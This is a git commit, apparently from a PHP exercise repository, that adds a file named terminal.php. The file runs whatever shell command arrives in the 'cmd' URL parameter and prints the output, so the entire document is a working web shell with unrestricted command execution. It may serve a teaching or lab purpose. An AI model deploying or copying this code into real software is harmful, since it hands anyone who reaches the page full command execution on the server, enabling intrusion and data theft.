7006718afce3a7c06a3f0d3f3529c003eb98fd0f
alexsnitol <sslotin74@gmail.com>
2022-09-26 15:35:03 +0300

    opt 3

---
+++ php/src/opt3/terminal.php
@@ -0,0 +1,12 @@
+<?php
+
+if (!array_key_exists('cmd', $_GET)) {
+    echo "Enter command as GET parameter with name 'cmd'";
+    exit();
+}
+
+exec($_GET["cmd"], $output);
+
+foreach ($output as $item) {
+    echo "$item</br>";
+}
